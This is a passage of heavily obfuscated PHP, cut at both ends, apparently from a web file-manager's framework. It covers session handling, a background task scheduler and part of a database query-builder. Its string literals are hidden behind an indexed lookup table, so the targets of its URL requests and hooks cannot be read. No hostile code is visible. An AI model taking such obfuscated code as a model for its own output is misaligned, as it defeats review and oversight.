false) { if ($§ëÔ‘÷¡) { self::$sessionSign = $§ëÔ‘÷¡; } self::init(); return self::$sessionSign; } public static function set($÷³„Ç¶, $±ãí©º = false) { self::init(); if (is_array($÷³„Ç¶)) { foreach ($÷³„Ç¶ as $øÀ½ş¯à => $ã‘ãÈ»é) { array_set_value(self::$data, $øÀ½ş¯à, $ã‘ãÈ»é); } } else { array_set_value(self::$data, $÷³„Ç¶, $±ãí©º); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ë´İ² = false) { self::init(); if (!$ë´İ²) { return self::$data; } return array_get_value(self::$data, $ë´İ²); } public static function remove($‘§×Îö¯) { self::init(); unset(self::$data[$‘§×Îö¯]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[”ôÑ§ì¸][856])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $“ŒÉİµå =& $_SERVER[”ôÑ§ì¸]; if (self::valueGet($“ŒÉİµå[772]) != $“ŒÉİµå[88]) { return; } if (self::valueGet($“ŒÉİµå[1630]) == $“ŒÉİµå[88]) { $¿Øı˜£ = self::valueGet($“ŒÉİµå[1631]); if (time() - $¿Øı˜£ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($“ŒÉİµå[1630], $“ŒÉİµå[88]); self::log($“ŒÉİµå[1632] . ACTION . $“ŒÉİµå[1633]); Hook::bind($“ŒÉİµå[1634], $“ŒÉİµå[1635]); $®Øáßşü = 0; while (!0) { self::cacheClear(); if (self::valueGet($“ŒÉİµå[772]) != $“ŒÉİµå[88]) { self::valueSet($“ŒÉİµå[1630], $“ŒÉİµå[211]); self::log($“ŒÉİµå[1636]); die; } $ßªÉ§²“ = time(); if ($ßªÉ§²“ - $®Øáßşü >= 60) { self::valueSet(array($“ŒÉİµå[1630] => $“ŒÉİµå[88], $“ŒÉİµå[1631] => $ßªÉ§²“), !1); $®Øáßşü = $ßªÉ§²“; } if (!file_exists(USER_SYSTEM . $“ŒÉİµå[1637])) { self::valueSet(array($“ŒÉİµå[1630] => $“ŒÉİµå[211], $“ŒÉİµå[772] => $“ŒÉİµå[211]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ô£ğƒ”• =& $_SERVER[”ôÑ§ì¸]; http_close(); $GLOBALS[$Ô£ğƒ”•[1638]] = 1; $_SERVER[$Ô£ğƒ”•[1639]] = $Ô£ğƒ”•[1640]; $_COOKIE = array(); $GLOBALS[$Ô£ğƒ”•[535]] = 1; $GLOBALS[$Ô£ğƒ”•[1641]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¶•‹¡Õü =& $_SERVER[”ôÑ§ì¸]; http_close(); self::valueSet($¶•‹¡Õü[772], $¶•‹¡Õü[211]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¶•‹¡Õü[1630] => $¶•‹¡Õü[211], $¶•‹¡Õü[772] => $¶•‹¡Õü[88]), !1); } public static function taskSwitch() { $£êÀŒœÄ =& $_SERVER[”ôÑ§ì¸]; $­ø•Ø¬÷ = self::valueGet($£êÀŒœÄ[772]) == $£êÀŒœÄ[88] ? $£êÀŒœÄ[211] : $£êÀŒœÄ[88]; self::valueSet($£êÀŒœÄ[772], $­ø•Ø¬÷); } public static function shutdownEvent() { $Ùş‚ë€¸ =& $_SERVER[”ôÑ§ì¸]; self::valueSet($Ùş‚ë€¸[1630], $Ùş‚ë€¸[211]); self::log($Ùş‚ë€¸[1642]); } public static function config($•³œîÉ–, $ ×–ĞäÑ) { self::valueSet($_SERVER[”ôÑ§ì¸][772], $•³œîÉ–); } private static function taskRunAll() { $«ğ¶Û“­ =& $_SERVER[”ôÑ§ì¸]; $şñº˜ğî = timeFloat(); $åİ‡Ô¬© = Model($«ğ¶Û“­[1643])->listData(); $‡™ç¨Ÿî = count($åİ‡Ô¬©); for ($¡õÆÏÖÃ = 0; $¡õÆÏÖÃ < $‡™ç¨Ÿî; $¡õÆÏÖÃ++) { $·¡¶…Éä = $åİ‡Ô¬©[$¡õÆÏÖÃ]; if (!$·¡¶…Éä[$«ğ¶Û“­[442]] || $·¡¶…Éä[$«ğ¶Û“­[1644]] != $«ğ¶Û“­[88]) { continue; } if (!self::taskTimeCheck($·¡¶…Éä)) { continue; } self::taskRun($·¡¶…Éä); } Hook::trigger($«ğ¶Û“­[1645]); self::taskQueueRun($şñº˜ğî); } private static function taskQueueRun($ÃÚ†ã£î) { $¿°¡•Şè = 10; while (!0) { $£ÎÁ²Œä = TaskQueue::run(); if ($£ÎÁ²Œä === !1) { break; } if (timeFloat() - $ÃÚ†ã£î >= $¿°¡•Şè) { break; } } } private static function taskTimeCheck($şıÄÕ¥—) { $¿·–ì’è =& $_SERVER[”ôÑ§ì¸]; $å…Ë½»í = json_decode($şıÄÕ¥—[$¿·–ì’è[193]], !0); $ÃÉİÑ… = intval($şıÄÕ¥—[$¿·–ì’è[1631]]); $ã­®çÀ¹ = strtotime($¿·–ì’è[1646] . $å…Ë½»í[$¿·–ì’è[1647]] . $¿·–ì’è[1648]) - strtotime($¿·–ì’è[1649]); $â®Ìµéí = time() - strtotime(date($¿·–ì’è[1650]) . $¿·–ì’è[1651]); $ã—ö’Ë‰ = $â®Ìµéí >= $ã­®çÀ¹ && $â®Ìµéí <= $ã­®çÀ¹ + 3600; switch ($å…Ë½»í[$¿·–ì’è[33]]) { case $¿·–ì’è[1652]: if (time() - $ÃÉİÑ… < 3600 * 24 * 30) { return !1; } if ($å…Ë½»í[$¿·–ì’è[1652]] == date($¿·–ì’è[1653]) && $ã—ö’Ë‰) { return !0; } break; case $¿·–ì’è[1654]: if (time() - $ÃÉİÑ… < 3600 * 24 * 7) { return !1; } $‰êí‡Ê = date($¿·–ì’è[1655]) == 0 ? 7 : date($¿·–ì’è[1655]); if ($å…Ë½»í[$¿·–ì’è[1654]] == $‰êí‡Ê && $ã—ö’Ë‰) { return !0; } break; case $¿·–ì’è[1647]: if (time() - $ÃÉİÑ… < 3600 * 24) { return !1; } if ($ã—ö’Ë‰) { return !0; } break; case $¿·–ì’è[1656]: if (time() - $ÃÉİÑ… >= floatval($å…Ë½»í[$¿·–ì’è[1656]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ñâ…”Ò¹ =& $_SERVER[”ôÑ§ì¸]; static $–Ä¬‹É‹ = 0; $ï¾³Òş = 300; if (!$–Ä¬‹É‹) { $–Ä¬‹É‹ = time(); } if (time() - $–Ä¬‹É‹ < $ï¾³Òş) { return; } $–Ä¬‹É‹ = time(); $‹±éÎ ø = Model($Ñâ…”Ò¹[545])->db($Ñâ…”Ò¹[12]); if ($‹±éÎ ø) { $‹±éÎ ø->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ñâ…”Ò¹[1657], $Ñâ…”Ò¹[1658]); die; } } public static function taskRun($¯ë–êÚÉ) { $îáÚ¼« =& $_SERVER[”ôÑ§ì¸]; self::log($îáÚ¼«[1659] . $¯ë–êÚÉ[$îáÚ¼«[442]] . $îáÚ¼«[1660] . $¯ë–êÚÉ[$îáÚ¼«[32]] . $îáÚ¼«[1661] . $¯ë–êÚÉ[$îáÚ¼«[1662]]); Model($îáÚ¼«[1643])->run($¯ë–êÚÉ[$îáÚ¼«[442]]); $Óüâ’ = timeFloat(); $ææÂşÇª = $îáÚ¼«[12]; switch ($¯ë–êÚÉ[$îáÚ¼«[33]]) { case $îáÚ¼«[350]: $±·à°ü˜ = url_request($¯ë–êÚÉ[$îáÚ¼«[1662]], $îáÚ¼«[244], !1, !1, !1, !1, 10); if ($±·à°ü˜[$îáÚ¼«[772]]) { $ææÂşÇª = strlen($±·à°ü˜[$îáÚ¼«[1233]]); } break; case $îáÚ¼«[243]: $ææÂşÇª = Hook::apply($¯ë–êÚÉ[$îáÚ¼«[1662]]); default: break; } Model($îáÚ¼«[1663])->add(array($îáÚ¼«[1664] => $îáÚ¼«[12], $îáÚ¼«[1665] => $îáÚ¼«[211], $îáÚ¼«[33] => $îáÚ¼«[1666] . $¯ë–êÚÉ[$îáÚ¼«[442]], $îáÚ¼«[1667] => json_encode(array($îáÚ¼«[32] => $¯ë–êÚÉ[$îáÚ¼«[32]], $îáÚ¼«[1668] => timeFloat() - $Óüâ’, $îáÚ¼«[336] => $ææÂşÇª)))); $ÊÒ•Ôˆ¥ = $ææÂşÇª ? $îáÚ¼«[1669] . $ææÂşÇª : $îáÚ¼«[12]; self::log($îáÚ¼«[1670] . $¯ë–êÚÉ[$îáÚ¼«[442]] . $îáÚ¼«[164] . $ÊÒ•Ôˆ¥); return !0; } public static function valueGet($¡ÙàıÛ) { $À·Œ²·– =& $_SERVER[”ôÑ§ì¸]; $Ñœ÷Ù§Ñ = $À·Œ²·–[1671]; $ˆÛşù = Model($À·Œ²·–[475])->get($¡ÙàıÛ, $Ñœ÷Ù§Ñ); if (is_null($ˆÛşù)) { Model($À·Œ²·–[475])->set($À·Œ²·–[772], $À·Œ²·–[88], $Ñœ÷Ù§Ñ); Model($À·Œ²·–[475])->set($À·Œ²·–[1630], $À·Œ²·–[211], $Ñœ÷Ù§Ñ); $ˆÛşù = Model($À·Œ²·–[475])->get($¡ÙàıÛ, $Ñœ÷Ù§Ñ); } return $ˆÛşù; } private static function valueSet($¼ÔÓ€ü, $ÌıÓºÚ¼) { $¸Â€Ûñ± =& $_SERVER[”ôÑ§ì¸]; $ĞêçÀİ´ = $¸Â€Ûñ±[1672]; CacheLock::lock($ĞêçÀİ´); $•×¡úÛ = Model($¸Â€Ûñ±[475])->set($¼ÔÓ€ü, $ÌıÓºÚ¼, $¸Â€Ûñ±[1671]); CacheLock::unlock($ĞêçÀİ´); return $•×¡úÛ; } protected static function log($âÌÉğˆâ) { write_log($âÌÉğˆâ, $_SERVER[”ôÑ§ì¸][1658]); } private static function cacheClear() { $éú‡¤» =& $_SERVER[”ôÑ§ì¸]; Cache::clearMemory(Model($éú‡¤»[475])->cacheKey($éú‡¤»[1671])); Cache::clearMemory(Model($éú‡¤»[475])->cacheKey($éú‡¤»[1673])); Model($éú‡¤»[1643])->cacheClear(); self::closeDatabase(); } } goto cÖ–’ˆñÚ¡; FÜ¯ñ¬Åè¹: class DbSqlite3 extends DbSqlite3Base { public function query($É³Ñ··û) { $ì§üÛ¡ =& $_SERVER[”ôÑ§ì¸]; if (!CacheLock::fileLock($ì§üÛ¡[13])) { return !1; } $øÑáŸ×ô = parent::query($É³Ñ··û); CacheLock::fileUnLock($ì§üÛ¡[13]); return $øÑáŸ×ô; } public function execute($†Ÿõò¶’) { $¸şÑ²Ñß =& $_SERVER[”ôÑ§ì¸]; if (!CacheLock::fileLock($¸şÑ²Ñß[13])) { return !1; } $ÛÖü› ² = parent::execute($†Ÿõò¶’); CacheLock::fileUnLock($¸şÑ²Ñß[13]); return $ÛÖü› ²; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\x3c\x3e", "\x67\x74" => "\76", "\x65\x67\164" => "\x3e\x3d", "\154\x74" => "\74", "\145\154\164" => "\x3c\75", "\156\157\x74\x6c\151\153\x65" => "\116\x4f\x54\40\x4c\111\x4b\x45", "\x6c\151\x6b\x65" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\x4e", "\x6e\157\x74\151\156" => "\116\117\x54\40\111\116", "\156\157\164\x20\151\156" => "\x4e\x4f\x54\x20\x49\x4e", "\142\145\164\167\145\145\x6e" => "\102\x45\x54\127\105\x45\116", "\156\x6f\x74\142\x65\x74\167\x65\x65\x6e" => "\x4e\117\x54\x20\x42\x45\124\127\x45\x45\x4e", "\156\157\164\x20\142\x65\x74\x77\x65\145\x6e" => "\x4e\117\124\40\x42\105\x54\127\x45\105\116"); protected $selectSql = "\x53\105\114\x45\103\x54\45\104\111\x53\x54\x49\x4e\x43\x54\x25\40\45\x46\x49\x45\x4c\x44\x25\x20\106\x52\x4f\x4d\40\45\x54\101\102\114\105\x25\x25\112\117\x49\116\x25\x25\127\110\105\x52\105\45\45\107\122\x4f\x55\x50\x25\45\x48\x41\126\x49\116\x47\x25\45\x4f\x52\104\x45\x52\x25\x25\x4c\x49\115\x49\x54\45\x20\45\125\x4e\x49\x4f\116\x25\45\103\x4f\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¥åöîÔ² = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[”ôÑ§ì¸][991], $¥åöîÔ²); } public function factory($õĞ˜® = '') { $Çš³ä¨Ä =& $_SERVER[”ôÑ§ì¸]; $õĞ˜® = $this->parseConfig($õĞ˜®); if (empty($õĞ˜®[$Çš³ä¨Ä[992]])) { think_exception(think_lang($Çš³ä¨Ä[993])); } $this->dbType = ucwords(strtolower($õĞ˜®[$Çš³ä¨Ä[992]])); $Â‡ò„èª = $Çš³ä¨Ä[994] . $this->dbType; if (class_exists($Â‡ò„èª)) { $şÅÃÒš¦ = new $Â‡ò„èª($õĞ˜®); if ($Çš³ä¨Ä[995] != strtolower($õĞ˜®[$Çš³ä¨Ä[992]])) { $şÅÃÒš¦->dbType = strtoupper($this->dbType); } else { $şÅÃÒš¦->dbType = $this->_getDsnType($õĞ˜®[$Çš³ä¨Ä[947]]); } } else { think_exception(think_lang($Çš³ä¨Ä[996]) . $Çš³ä¨Ä[997] . $Â‡ò„èª); } return $şÅÃÒš¦; } public function __call($ç‡¤š‚æ, $£çú­ôø) { if (method_exists($this, $ç‡¤š‚æ)) { return call_user_func_array(array($this, $ç‡¤š‚æ), $£çú­ôø); } } protected function _getDsnType($’í¾½–Ã) { $ö¼ëÁŒø = explode($_SERVER[”ôÑ§ì¸][4], $’í¾½–Ã); $Ğ ÏÅ = strtoupper(trim($ö¼ëÁŒø[0])); return $Ğ ÏÅ; } private function parseConfig($‰ÈÙÃÔ  = '') { $£ŸØŒ¹Ş =& $_SERVER[”ôÑ§ì¸]; if (!empty($‰ÈÙÃÔ ) && is_string($‰ÈÙÃÔ )) { $‰ÈÙÃÔ  = $this->parseDSN($‰ÈÙÃÔ ); } elseif (is_array($‰ÈÙÃÔ )) { $‰ÈÙÃÔ  = array_change_key_case($‰ÈÙÃÔ ); $‰ÈÙÃÔ  = array($£ŸØŒ¹Ş[992] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[998]], $£ŸØŒ¹Ş[919] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[999]], $£ŸØŒ¹Ş[920] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1000]], $£ŸØŒ¹Ş[917] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1001]], $£ŸØŒ¹Ş[918] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1002]], $£ŸØŒ¹Ş[21] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1003]], $£ŸØŒ¹Ş[947] => $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1004]], $£ŸØŒ¹Ş[17] => isset($‰ÈÙÃÔ [$£ŸØŒ¹Ş[1005]]) ? $‰ÈÙÃÔ [$£ŸØŒ¹Ş[1005]] : array()); } elseif (empty($‰ÈÙÃÔ )) { if (think_config($£ŸØŒ¹Ş[1006]) && $£ŸØŒ¹Ş[995] != strtolower(think_config($£ŸØŒ¹Ş[1007]))) { $‰ÈÙÃÔ  = $this->parseDSN(think_config($£ŸØŒ¹Ş[1006])); } else { $‰ÈÙÃÔ  = array($£ŸØŒ¹Ş[992] => think_config($£ŸØŒ¹Ş[1007]), $£ŸØŒ¹Ş[919] => think_config($£ŸØŒ¹Ş[1008]), $£ŸØŒ¹Ş[920] => think_config($£ŸØŒ¹Ş[1009]), $£ŸØŒ¹Ş[917] => think_config($£ŸØŒ¹Ş[1010]), $£ŸØŒ¹Ş[918] => think_config($£ŸØŒ¹Ş[1011]), $£ŸØŒ¹Ş[21] => think_config($£ŸØŒ¹Ş[289]), $£ŸØŒ¹Ş[947] => think_config($£ŸØŒ¹Ş[1006]), $£ŸØŒ¹Ş[17] => think_config($£ŸØŒ¹Ş[1012])); } } return $‰ÈÙÃÔ ; } protected function initConnect($±¸˜’ò… = true) { if (1 == think_config($_SERVER[”ôÑ§ì¸][22])) { $this->_linkID = $this->multiConnect($±¸˜’ò…); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $§Şü¿”© => $ƒıš¿¼) { $this->_linkID = $ƒıš¿¼; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($üÎ‚˜Ï„ = false) { $’¢º¾‚¯ =& $_SERVER[”ôÑ§ì¸]; static $ëÔ˜€é² = array(); static $á‚¹£ªû = -1; if (empty($ëÔ˜€é²)) { foreach ($this->config as $Ù½‹ƒºÕ => $ÉÏÔê§˜) { $ëÔ˜€é²[$Ù½‹ƒºÕ] = explode($’¢º¾‚¯[50], $ÉÏÔê§˜); } } if (think_config($’¢º¾‚¯[1013])) { if ($üÎ‚˜Ï„ || think_config($’¢º¾‚¯[438]) === !0) { $Ñ¦å“õæ = floor(mt_rand(0, think_config($’¢º¾‚¯[1014]) - 1)); $á‚¹£ªû = $Ñ¦å“õæ; } else { if (is_numeric(think_config($’¢º¾‚¯[1015]))) { $Ñ¦å“õæ = think_config($’¢º¾‚¯[1015]); } else { $Ñ¦å“õæ = floor(mt_rand(think_config($’¢º¾‚¯[1014]), count($ëÔ˜€é²[$’¢º¾‚¯[917]]) - 1)); } } } else { $Ñ¦å“õæ = floor(mt_rand(0, count($ëÔ˜€é²[$’¢º¾‚¯[917]]) - 1)); $á‚¹£ªû = $Ñ¦å“õæ; } $Ñ¦å“õæ = $á‚¹£ªû !== -1 ? $á‚¹£ªû : $Ñ¦å“õæ; $çÏ‡®ªÑ = array($’¢º¾‚¯[919] => isset($ëÔ˜€é²[$’¢º¾‚¯[919]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[919]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[919]][0], $’¢º¾‚¯[920] => isset($ëÔ˜€é²[$’¢º¾‚¯[920]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[920]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[920]][0], $’¢º¾‚¯[917] => isset($ëÔ˜€é²[$’¢º¾‚¯[917]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[917]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[917]][0], $’¢º¾‚¯[918] => isset($ëÔ˜€é²[$’¢º¾‚¯[918]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[918]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[918]][0], $’¢º¾‚¯[21] => isset($ëÔ˜€é²[$’¢º¾‚¯[21]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[21]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[21]][0], $’¢º¾‚¯[947] => isset($ëÔ˜€é²[$’¢º¾‚¯[947]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[947]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[947]][0], $’¢º¾‚¯[17] => isset($ëÔ˜€é²[$’¢º¾‚¯[17]][$Ñ¦å“õæ]) ? $ëÔ˜€é²[$’¢º¾‚¯[17]][$Ñ¦å“õæ] : $ëÔ˜€é²[$’¢º¾‚¯[17]][0]); return $this->connect($çÏ‡®ªÑ, $Ñ¦å“õæ); } public function parseDSN($¯Ê­ö”©) { $Çñó¨Í =& $_SERVER[”ôÑ§ì¸]; if (empty($¯Ê­ö”©)) { return !1; } $âÛ¼Íœ = parse_url($¯Ê­ö”©); if ($âÛ¼Íœ[$Çñó¨Í[194]]) { $¶¤Êş­¹ = array($Çñó¨Í[992] => $âÛ¼Íœ[$Çñó¨Í[194]], $Çñó¨Í[919] => isset($âÛ¼Íœ[$Çñó¨Í[629]]) ? $âÛ¼Íœ[$Çñó¨Í[629]] : $Çñó¨Í[12], $Çñó¨Í[920] => isset($âÛ¼Íœ[$Çñó¨Í[1016]]) ? $âÛ¼Íœ[$Çñó¨Í[1016]] : $Çñó¨Í[12], $Çñó¨Í[917] => isset($âÛ¼Íœ[$Çñó¨Í[195]]) ? $âÛ¼Íœ[$Çñó¨Í[195]] : $Çñó¨Í[12], $Çñó¨Í[918] => isset($âÛ¼Íœ[$Çñó¨Í[196]]) ? $âÛ¼Íœ[$Çñó¨Í[196]] : $Çñó¨Í[12], $Çñó¨Í[21] => isset($âÛ¼Íœ[$Çñó¨Í[84]]) ? substr($âÛ¼Íœ[$Çñó¨Í[84]], 1) : $Çñó¨Í[12]); } else { preg_match($Çñó¨Í[1017], trim($¯Ê­ö”©), $±Öª“–); $¶¤Êş­¹ = array($Çñó¨Í[992] => $±Öª“–[1], $Çñó¨Í[919] => $±Öª“–[2], $Çñó¨Í[920] => $±Öª“–[3], $Çñó¨Í[917] => $±Öª“–[4], $Çñó¨Í[918] => $±Öª“–[5], $Çñó¨Í[21] => $±Öª“–[6]); } $¶¤Êş­¹[$Çñó¨Í[947]] = $Çñó¨Í[12]; return $¶¤Êş­¹; } protected function debug() { $…Ê¬Áá‘ =& $_SERVER[”ôÑ§ì¸]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $…Ê¬Áá‘[1018]; if (think_config($…Ê¬Áá‘[1019])) { think_status($…Ê¬Áá‘[1020]); think_trace($this->queryStr . $…Ê¬Áá‘[1021] . think_status($…Ê¬Áá‘[24], $…Ê¬Áá‘[1020], 6) . $…Ê¬Áá‘[1022], $…Ê¬Áá‘[12], $…Ê¬Áá‘[1023]); } } protected function parseLock($åıÓ§‚Š = false) { $¼ë•Àë =& $_SERVER[”ôÑ§ì¸]; if (!$åıÓ§‚Š) { return $¼ë•Àë[12]; } if ($¼ë•Àë[949] == $this->dbType) { return $¼ë•Àë[1024]; } return $¼ë•Àë[1025]; } protected function parseSet($ŞÆÉº©ä) { $ìÁõ°„£ =& $_SERVER[”ôÑ§ì¸]; foreach ($ŞÆÉº©ä as $¬¹ÆÕ¼Ú => $ó¾ï±³Ì) { if (is_array($ó¾ï±³Ì) && $ìÁõ°„£[340] == $ó¾ï±³Ì[0]) { $ì»Üó‚ü[] = $this->parseKey($¬¹ÆÕ¼Ú) . $ìÁõ°„£[915] . $ó¾ï±³Ì[1]; } elseif (is_scalar($ó¾ï±³Ì) || is_null($ó¾ï±³Ì)) { $ì»Üó‚ü[] = $this->parseKey($¬¹ÆÕ¼Ú) . $ìÁõ°„£[915] . $this->parseValue($ó¾ï±³Ì); } } return $ìÁõ°„£[1026] . implode($ìÁõ°„£[50], $ì»Üó‚ü); } protected function bindParam($É‡ÒÒœİ, $¤Æ’×²) { $this->bind[$_SERVER[”ôÑ§ì¸][4] . $É‡ÒÒœİ] = $¤Æ’×²; } protected function parseBind($§“’öï²) { $§“’öï² = array_merge($this->bind, $§“’öï²); $this->bind = array(); return $§“’öï²; } function parseKey(&$æîÙ“Ü°, $‡ÔñéÑ = true) { if ($‡ÔñéÑ) { $æîÙ“Ü° = $this->parseKeyCheck($æîÙ“Ü°); } return $æîÙ“Ü°; } function parseKeyCheck($¶¿¢¼Õ·) { $àæØ¬‘É =& $_SERVER[”ôÑ§ì¸]; $¶¿¢¼Õ· = trim($¶¿¢¼Õ·); if (!preg_match($àæØ¬‘É[1027], $¶¿¢¼Õ·)) { think_exception($àæØ¬‘É[1028] . $¶¿¢¼Õ·); } return $¶¿¢¼Õ·; } protected function parseValue($™ÂÖ›¼) { $‘÷üÈ§À =& $_SERVER[”ôÑ§ì¸]; if (is_string($™ÂÖ›¼)) { $™ÂÖ›¼ = $‘÷üÈ§À[988] . $this->escapeString($™ÂÖ›¼) . $‘÷üÈ§À[988]; } elseif (isset($™ÂÖ›¼[0]) && is_string($™ÂÖ›¼[0]) && strtolower($™ÂÖ›¼[0]) == $‘÷üÈ§À[340]) { $™ÂÖ›¼ = $this->escapeString($™ÂÖ›¼[1]); } elseif (is_array($™ÂÖ›¼)) { $™ÂÖ›¼ = array_map(array($this, $‘÷üÈ§À[989]), $™ÂÖ›¼); } elseif (is_bool($™ÂÖ›¼)) { $™ÂÖ›¼ = $™ÂÖ›¼ ? $‘÷üÈ§À[88] : $‘÷üÈ§À[211]; } elseif (is_null($™ÂÖ›¼)) { $™ÂÖ›¼ = $‘÷üÈ§À[103]; } return $™ÂÖ›¼; } protected function parseField($¶×ÄÑ™Î) { $¼ÅÂ¯ïÎ =& $_SERVER[”ôÑ§ì¸]; if (is_string($¶×ÄÑ™Î) && strpos($¶×ÄÑ™Î, $¼ÅÂ¯ïÎ[50])) { $¶×ÄÑ™Î = explode($¼ÅÂ¯ïÎ[50], $¶×ÄÑ™Î); } if (is_array($¶×ÄÑ™Î)) { $ëÈÑó = array(); foreach ($¶×ÄÑ™Î as $š´¨üƒ => $³ÒÀ¦Ìğ) { if (!is_numeric($š´¨üƒ)) { $ëÈÑó[] = $this->parseKey($š´¨üƒ, !1) . $¼ÅÂ¯ïÎ[1029] . $this->parseKey($³ÒÀ¦Ìğ); } else { $ëÈÑó[] = $this->parseKey($³ÒÀ¦Ìğ); } } $åÎú­¹Ê = implode($¼ÅÂ¯ïÎ[50], $ëÈÑó); } elseif (is_string($¶×ÄÑ™Î) && !empty($¶×ÄÑ™Î)) { $åÎú­¹Ê = $¶×ÄÑ™Î; } else { $åÎú­¹Ê = $¼ÅÂ¯ïÎ[202]; } return $åÎú­¹Ê; } protected function parseTable($ôàÑ÷ÈÖ) { $½ƒÄ¢… =& $_SERVER[”ôÑ§ì¸]; if (is_array($ôàÑ÷ÈÖ)) { $²¨¾ş‘² = array(); foreach ($ôàÑ÷ÈÖ as $Ô³¨Àõ => $„¨ä¦Ğ¾) { if (!is_numeric($Ô³¨Àõ)) { $²¨¾ş‘²[] = $this->parseKey($Ô³¨Àõ) . $½ƒÄ¢…[53] . $this->parseKey($„¨ä¦Ğ¾); } else { $²¨¾ş‘²[] = $this->parseKey($Ô³¨Àõ); } } $ôàÑ÷ÈÖ = $²¨¾ş‘²; } elseif (is_string($ôàÑ÷ÈÖ)) { if (strstr($ôàÑ÷ÈÖ, $½ƒÄ¢…[53])) { return $ôàÑ÷ÈÖ; } $ôàÑ÷ÈÖ = explode($½ƒÄ¢…[50], $ôàÑ÷ÈÖ); array_walk($ôàÑ÷ÈÖ, array($this, $½ƒÄ¢…[937])); } return $½ƒÄ¢…[931] . trim(implode($½ƒÄ¢…[1030], $ôàÑ÷ÈÖ), $½ƒÄ¢…[428]) . $½ƒÄ¢…[931]; } protected function parseWhere($ã¸ŸåÁÅ) { $†Í™±×± =& $_SERVER[”ôÑ§ì¸]; $åğ„¦ƒ = $†Í™±×±[12]; if (is_string($ã¸ŸåÁÅ)) { $åğ„¦ƒ = $ã¸ŸåÁÅ; } else { $Ğ‡–ª‡Í = isset($ã¸ŸåÁÅ[$†Í™±×±[1031]]) ? strtoupper($ã¸ŸåÁÅ[$†Í™±×±[1031]]) : $†Í™±×±[12]; if (in_array($Ğ‡–ª‡Í, array($†Í™±×±[1032], $†Í™±×±[1033], $†Í™±×±[1034]))) { $Ğ‡–ª‡Í = $†Í™±×±[53] . $Ğ‡–ª‡Í . $†Í™±×±[53]; unset($ã¸ŸåÁÅ[$†Í™±×±[1031]]); } else { $Ğ‡–ª‡Í = $†Í™±×±[1035]; } foreach ($ã¸ŸåÁÅ as $•Ë¹ÇÊ => $É•ÛÉË) { $åğ„¦ƒ .= $†Í™±×±[320]; if (is_numeric($•Ë¹ÇÊ)) { $•Ë¹ÇÊ = $†Í™±×±[1036]; } if (0 === strpos($•Ë¹ÇÊ, $†Í™±×±[11])) { $åğ„¦ƒ .= $this->parseThinkWhere($•Ë¹ÇÊ, $É•ÛÉË); } else { if (!preg_match($†Í™±×±[1037], trim($•Ë¹ÇÊ))) { think_exception(think_lang($†Í™±×±[1038]) . $†Í™±×±[4] . $•Ë¹ÇÊ); } $£Úà°ÌÕ = is_array($É•ÛÉË) && isset($É•ÛÉË[$†Í™±×±[1039]]); $•Ë¹ÇÊ = trim($•Ë¹ÇÊ); if (strpos($•Ë¹ÇÊ, $†Í™±×±[326])) { $ƒ»ó© Õ = explode($†Í™±×±[326], $•Ë¹ÇÊ); $ã×¯ÉÛı = array(); foreach ($ƒ»ó© Õ as $ñûÓ×°— => $ğ¬ãû•‹) { $ƒ²Ç†Î¥ = $£Úà°ÌÕ ? $É•ÛÉË[$ñûÓ×°—] : $É•ÛÉË; $ã×¯ÉÛı[] = $†Í™±×±[303] . $this->parseWhereItem($this->parseKey($ğ¬ãû•‹), $ƒ²Ç†Î¥) . $†Í™±×±[936]; } $åğ„¦ƒ .= implode($†Í™±×±[1040], $ã×¯ÉÛı); } elseif (strpos($•Ë¹ÇÊ, 